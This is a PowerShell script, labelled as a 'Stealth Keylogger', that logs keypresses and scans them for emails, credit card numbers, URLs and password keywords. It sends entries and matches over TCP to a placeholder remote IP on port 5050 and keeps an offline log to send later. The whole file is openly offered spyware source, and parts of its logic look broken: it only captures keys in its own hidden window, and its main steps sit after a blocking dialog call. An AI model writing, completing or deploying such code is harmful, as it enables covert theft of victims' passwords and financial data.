# Generate Encryption Key
function Generate-Key {
    if (-not (Test-Path "encryption_key.key")) {
        $key = [System.Convert]::ToBase64String((New-Object Byte[] 32 | ForEach-Object { Get-Random -Maximum 256 }))
        Set-Content -Path "encryption_key.key" -Value $key
    }
}

# Load Encryption Key
function Load-Key {
    return Get-Content -Path "encryption_key.key"
}

# Encrypt Data
function Encrypt-Data($data, $key) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Convert]::FromBase64String($key)
    $aes.IV = New-Object Byte[]($aes.BlockSize / 8)
    $encryptor = $aes.CreateEncryptor()
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    return [System.Convert]::ToBase64String($encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length))
}

# Encrypt Log File
function Encrypt-Log {
    $key = Load-Key
    $logData = Get-Content -Path $logFile -Raw
    $encryptedData = Encrypt-Data $logData $key
    Set-Content -Path "encrypted_log.txt" -Value $encryptedData
    Write-Output "Log encrypted successfully!"
}

# Keylogger Initialization
$logFile = "keylog.txt"
$offlineLog = "offline_log.txt"

# Log Keypresses
function On-KeyPress($key) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $key"

    Add-Content -Path $logFile -Value $logEntry
    Identify-SensitiveInfo $logEntry
    Send-Data $logEntry
}

# Send Data to Remote Server
function Send-Data($data) {
    $SERVER_IP = "YOUR_IP_ADDRESS"
    $SERVER_PORT = 5050

    try {
        $client = New-Object System.Net.Sockets.TcpClient($SERVER_IP, $SERVER_PORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine($data)
        $writer.Flush()
        $writer.Close()
        $client.Close()
    }
    catch {
        Add-Content -Path $offlineLog -Value $data
    }
}

# Send Stored Logs
function Send-StoredLogs {
    if (Test-Path $offlineLog) {
        $offlineData = Get-Content -Path $offlineLog -Raw
        Send-Data $offlineData
        Remove-Item -Path $offlineLog
    }
}

# Identify Sensitive Information
function Identify-SensitiveInfo($text) {
    $patterns = @{
        'email' = '[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'
        'credit_card' = '\b(?:\d[ -]*?){13,16}\b'
        'password_keywords' = @('password', 'login', 'credentials')
        'urls' = 'https?://[^\s]+'
    }

    foreach ($category in $patterns.Keys) {
        if ($category -eq 'password_keywords') {
            foreach ($keyword in $patterns['password_keywords']) {
                if ($text -match $keyword) {
                    Send-Data "Potential Password Found: $text"
                }
            }
        }
        else {
            if ($text -match $patterns[$category]) {
                Send-Data "Detected $category: $matches[0]"
            }
        }
    }
}

# System Tray Simulation
function Show-SystemTray {
    Add-Type -AssemblyName System.Windows.Forms
    $icon = New-Object System.Windows.Forms.NotifyIcon
    $icon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell).Path)
    $icon.Text = "Stealth Keylogger"
    $icon.Visible = $true

    $exitMenuItem = New-Object System.Windows.Forms.MenuItem("Exit", { $icon.Visible = $false; exit })
    $contextMenu = New-Object System.Windows.Forms.ContextMenu
    $contextMenu.MenuItems.Add($exitMenuItem)
    $icon.ContextMenu = $contextMenu
}

# Keylogger Loop
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.WindowState = 'Minimized'
$form.ShowInTaskbar = $false

$form.Add_KeyDown({
    On-KeyPress $_.KeyCode
})

$form.ShowDialog()

# Main Execution
Generate-Key
Encrypt-Log
Send-StoredLogs
Show-SystemTray
